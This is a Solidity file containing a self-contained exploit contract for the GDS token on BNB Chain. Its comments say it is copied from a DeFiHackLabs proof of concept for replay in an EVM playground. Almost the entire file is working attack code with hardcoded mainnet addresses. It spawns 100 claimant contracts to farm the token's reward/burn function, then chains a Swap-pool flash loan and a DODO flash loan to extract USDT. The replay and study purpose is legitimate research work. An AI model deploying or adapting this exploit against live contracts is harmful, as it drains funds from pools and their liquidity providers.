// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-GDS).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (both flash-loan callbacks, `executeOperation` for the Swap flash-loan pool and
// `DPPFlashLoanCall` for the DODO pool, live on the test itself; `address(this)`
// is the attacker throughout) — there is no standalone exploit contract to deploy.
// This is a faithful, self-contained copy of that inline attack (testExploit +
// both flash-loan callbacks + all helper functions + the ClaimReward sub-contract)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/GDS_exp.sol in the registry.
//
// Root cause: GDS's `pureUsdtToToken` reward/burn accounting can be farmed by
// spinning up many throwaway claimant contracts, each seeded with a slice of the
// attacker's own GDS + LP tokens, to repeatedly trigger the reward path and pull
// value back out through swaps and (later) a huge two-layer flash loan (BSC Swap
// flash-loan pool -> DODO DVM) used to size up the GDS/USDT liquidity round-trip.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface GDSToken {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function pureUsdtToToken(uint256 _uAmount) external returns (uint256);
}

interface Uni_Pair_V2 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface Uni_Router_V2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ISwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface IClaimReward {
    function transferToken() external;
    function withdraw() external;
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

// Faithful copy of the test's ClaimReward helper: each instance is a throwaway
// "claimant" seeded with a slice of the attacker's GDS + LP tokens, used to farm
// GDS.pureUsdtToToken()'s reward/burn path and later exit back through the router.
contract ClaimReward {
    address Owner;
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    constructor() {
        Owner = msg.sender;
    }

    function transferToken() external {
        GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
    }

    function withdraw() external {
        GDS.transfer(deadAddress, 10_000);
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
        GDS.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GDS);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GDS.balanceOf(address(this)), 0, path, Owner, block.timestamp
        );
    }
}

contract GDSExploit {
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    address[] contractList;
    uint256 PerContractGDSAmount;
    uint256 SwapFlashLoanAmount;
    uint256 dodoFlashLoanAmount;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    // step 0: wrap 50 BNB into WBNB, then walk WBNB -> USDT -> GDS, seed a
    // GDS/USDT LP position, farm 100 ClaimReward claimants, then trigger the
    // two-layer flash loan that closes out the attack.
    function run() external {
        (bool ok,) = address(WBNB).call{value: 50 ether}("");
        require(ok, "wrap BNB failed");
        WBNBToUSDT();
        USDTToGDS(10 * 1e18);
        GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));
        USDTToGDS(USDT.balanceOf(address(this)));
        PerContractGDSAmount = GDS.balanceOf(address(this)) / 100;
        ClaimRewardFactory();

        SwapFlashLoan();
    }

    function SwapFlashLoan() internal {
        SwapFlashLoanAmount = USDT.balanceOf(address(swapFlashLoan));
        swapFlashLoan.flashLoan(address(this), address(USDT), SwapFlashLoanAmount, new bytes(1));
    }

    // Callback from the Swap flash-loan pool (BSC "Swap" money-market flash loan).
    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external {
        DODOFLashLoan();
        USDT.transfer(address(swapFlashLoan), SwapFlashLoanAmount * 10_000 / 9992 + 1000);
    }

    function DODOFLashLoan() internal {
        dodoFlashLoanAmount = USDT.balanceOf(dodo);
        DVM(dodo).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));
    }

    // Callback from the DODO DVM pool.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToGDS(600_000 * 1e18);
        GDSUSDTAddLiquidity(USDT.balanceOf(address(this)), GDS.balanceOf(address(this)));
        WithdrawRewardFactory();
        GDSUSDTRemovLiquidity();
        GDSToUSDT();
        USDT.transfer(dodo, dodoFlashLoanAmount);
    }

    function ClaimRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            ClaimReward claim = new ClaimReward();
            contractList.push(address(claim));
            Pair.transfer(address(claim), Pair.balanceOf(address(this)));
            GDS.transfer(address(claim), PerContractGDSAmount);
            claim.transferToken();
        }
    }

    function WithdrawRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            Pair.transfer(contractList[i], Pair.balanceOf(address(this)));
            IClaimReward(contractList[i]).withdraw();
        }
    }

    function WBNBToUSDT() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function USDTToGDS(uint256 USDTAmount) internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(GDS);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDTAmount, 0, path, address(this), block.timestamp
        );
    }

    function GDSUSDTAddLiquidity(uint256 USDTAmount, uint256 GDSAmount) internal {
        USDT.approve(address(Router), type(uint256).max);
        GDS.approve(address(Router), type(uint256).max);
        Router.addLiquidity(address(USDT), address(GDS), USDTAmount, GDSAmount, 0, 0, address(this), block.timestamp);
    }

    function GDSUSDTRemovLiquidity() internal {
        Pair.approve(address(Router), type(uint256).max);
        Router.removeLiquidity(
            address(USDT), address(GDS), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
    }

    function GDSToUSDT() internal {
        GDS.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GDS);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GDS.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
